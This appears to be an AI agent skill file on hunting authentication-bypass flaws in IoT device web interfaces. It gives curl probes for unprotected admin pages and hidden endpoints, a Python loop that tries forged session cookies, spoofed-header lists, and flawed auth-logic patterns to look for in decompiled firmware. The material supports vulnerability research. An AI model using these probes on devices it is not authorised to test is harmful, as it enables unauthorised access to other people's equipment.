---
name: auth-bypass
description: Authentication bypass vulnerability hunting in IoT firmware. Use when analyzing login mechanisms, session management, access control, or authentication logic in web interfaces, APIs, or network services of embedded devices. Triggers on auth bypass, login bypass, session hijacking, or access control analysis tasks.
---

# Authentication Bypass Hunting

Find authentication bypass vulnerabilities in IoT device interfaces.

## Workflow

1. Map authentication endpoints
2. Analyze authentication logic in binary/scripts
3. Test bypass techniques
4. Verify unauthorized access

## Common Bypass Categories

### 1. Direct URL Access (Forced Browsing)
Many IoT devices only check auth on the login page, not on internal pages.

```bash
# Discover all accessible endpoints
strings httpd | grep -E "^/[a-zA-Z]" | sort -u

# Test direct access without auth
curl -v http://<device>/settings.htm
curl -v http://<device>/admin/system.asp
curl -v http://<device>/goform/getSystemInfo
```

### 2. Cookie/Session Manipulation
```python
import requests

# Test empty/default session cookies
cookies_to_try = [
    {"session": ""},
    {"session": "admin"},
    {"Authorization": ""},
    {"uid": "1"},
    {"level": "admin"},
    {"logined": "1"},
]

for cookie in cookies_to_try:
    resp = requests.get(
        f"http://<device>/admin/",
        cookies=cookie,
        allow_redirects=False
    )
    if resp.status_code == 200 and "login" not in resp.text.lower():
        print(f"BYPASS with cookie: {cookie}")
```

### 3. HTTP Header Bypass
```python
# Some devices trust specific headers
headers_to_try = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"Referer": "http://<device>/login.htm"},
    {"X-Real-IP": "127.0.0.1"},
    {"Host": "localhost"},
]
```

### 4. Authentication Logic Flaws (Binary Analysis)

Look for these patterns in Ghidra decompilation:

```c
// Pattern: strcmp return value check bypass
if (strcmp(user_password, stored_password) == 0) {
    // authenticated
}
// If strcmp is called but return value ignored → bypass

// Pattern: Weak session token
session_id = time(NULL);  // Predictable!

// Pattern: Client-side auth check
// JavaScript-only auth that can be bypassed by direct API calls
```

### 5. Default/Hidden API Endpoints
```bash
# Common unauthenticated API patterns in IoT
curl http://<device>/cgi-bin/info.cgi
curl http://<device>/HNAP1/GetDeviceInfo
curl http://<device>/api/device/info
curl "http://<device>/goform/getSystemInfo"
curl http://<device>/currentsetting.htm
curl http://<device>/debug.htm
```

## Binary Analysis Checklist

In the main web server binary, search for:

1. **Auth check functions**: `check_login`, `verify_auth`, `is_authenticated`, `checkUser`
2. **Session functions**: `create_session`, `check_session`, `validate_token`
3. **Bypass indicators**:
   - Functions that return early with success
   - Auth checks that only validate specific URL prefixes
   - Missing auth checks on certain URL handlers

## CWE References

- **CWE-287**: Improper Authentication
- **CWE-306**: Missing Authentication for Critical Function
- **CWE-302**: Authentication Bypass by Assumed-Immutable Data
- **CWE-284**: Improper Access Control
- **CWE-639**: Authorization Bypass Through User-Controlled Key
